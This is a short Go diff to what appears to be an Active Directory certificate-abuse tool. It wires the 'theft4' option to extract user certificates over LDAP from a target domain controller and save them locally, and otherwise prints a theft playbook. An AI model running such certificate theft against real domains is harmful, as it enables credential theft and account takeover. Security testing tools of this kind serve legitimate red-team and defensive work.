@@ -70,6 +70,19 @@ Examples:
 			if len(certTheft) <= 2 && certTheft[0] >= '0' && certTheft[0] <= '9' {
 				certTheft = "theft" + certTheft
 			}
+			// THEFT4 is automated via LDAP — run real extraction if credentials provided
+			if strings.EqualFold(certTheft, "theft4") {
+				cfg := buildADCSConfig(cmd)
+				if cfg.TargetDC != "" && cfg.Domain != "" {
+					outputDir, _ := cmd.Flags().GetString("output")
+					if outputDir == "" {
+						outputDir = "theft4_certs"
+					}
+					_, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
+					return err
+				}
+				// Fall through to guidance if no credentials
+			}
 			pki.PrintCertTheftPlaybook(certTheft)
 			return nil
 		}
